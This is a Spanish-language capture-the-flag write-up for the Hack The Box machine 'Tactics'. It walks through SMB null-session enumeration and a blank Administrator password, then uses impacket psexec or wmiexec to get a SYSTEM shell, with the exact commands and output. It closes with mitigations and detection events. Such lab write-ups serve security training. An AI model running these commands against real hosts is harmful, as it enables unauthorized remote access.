---
machine: Tactics
os: Windows
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [windows, smb, blank-password, psexec, tier1]
---

# Tactics — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Available · Starting Point · Tier 1 · Windows · Very Easy

## TL;DR

**SMB (445/tcp)** permite sesión nula y revela los shares. La cuenta `Administrator` tiene **contraseña vacía**, así que `psexec` con esa contraseña abre una shell **SYSTEM** y la flag está en el escritorio del administrador.

---

## Reconocimiento

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows Server
```

- Host Windows sin web ni WinRM: la superficie es SMB/RPC.
- `nmap --script smb-os-discovery` confirma el nombre de equipo y el dominio de trabajo.

## Enumeración

```bash
smbclient -L //<TARGET_IP> -N
```

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

- La sesión nula funciona: no se pide contraseña para listar.
- Los shares administrativos (`C$`, `ADMIN$`) son la vía de entrada si se tienen credenciales.

Con `nxc`/`crackmapexec` se comprueba el estado de la autenticación:

```bash
nxc smb <TARGET_IP> -u Administrator -p '' 
```

```text
SMB  <TARGET_IP>  445  TACTICS  [+] TACTICS\Administrator: (Pwn3d!)
```

## Foothold

Contraseña vacía → autenticación válida. `psexec` sube un servicio temporal y devuelve shell como `NT AUTHORITY\SYSTEM`:

```bash
impacket-psexec 'Administrator:@<TARGET_IP>'
```

```text
[*] Requesting shares on <TARGET_IP>.....
[*] Found writable share ADMIN$
[*] Uploading file ...exe
[*] Creating service ...
Microsoft Windows [Version 10.0...]
C:\Windows\system32> whoami
nt authority\system
```

```text
type C:\Users\Administrator\Desktop\flag.txt
```

También sirve `wmiexec` si el servicio se bloqueara:

```bash
impacket-wmiexec 'Administrator:@<TARGET_IP>'
```

## Movimiento lateral

- No aplica: un host y una cuenta local con privilegios totales.
- Si hubiera dominio, el siguiente paso sería enumerar con `bloodhound`/`nxc`.

## Escalada de privilegios

- No aplica: `psexec` ya entrega **SYSTEM**.
- La causa es doble: cuenta sin contraseña **y** capacidad de crear servicios remotos por SMB.

## Evidencia

- Listado SMB con sesión nula.
- `whoami` como SYSTEM y flag redactada.

## Lecciones aprendidas

- Probar contraseña vacía en `Administrator` es un paso de una línea y sigue funcionando en laboratorios y en redes descuidadas.
- La sesión nula de SMB no solo lista shares: confirma política de autenticación.
- `psexec` requiere escritura en `ADMIN$`; si falla, `wmiexec` usa otro canal (DCOM/WMI).
- `nxc smb` marca `Pwn3d!` cuando la cuenta es administradora local: ahorra intentos a ciegas.

## Mitigaciones y detección

**Cómo se corrige:**

- Política de contraseñas que prohíba valores vacíos y fuerce longitud/complejidad.
- Deshabilitar sesiones nulas (`RestrictAnonymous=1`, `EveryoneIncludesAnonymous=0`).
- Exigir SMB signing y limitar 445/135 a la red de gestión.
- Cuenta `Administrator` deshabilitada o renombrada, con LAPS para las locales.

**Cómo se detectaría:**

- Evento 4624 tipo 3 con `Administrator` y contraseña vacía.
- Creación de servicio remoto (7045) inmediatamente después de una conexión SMB.
- Accesos a `ADMIN$` desde estaciones no administrativas.

- CWE-258: Empty Password in Configuration File
- CWE-521: Weak Password Requirements
- MITRE ATT&CK: [T1078.001](https://attack.mitre.org/techniques/T1078/001/), [T1021.002 SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/), [T1569.002 Service Execution](https://attack.mitre.org/techniques/T1569/002/)

## Referencias

- [Impacket — psexec.py](https://github.com/fortra/impacket)
- [Microsoft — RestrictAnonymous](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-access-do-not-allow-anonymous-enumeration-of-sam-accounts-and-shares)
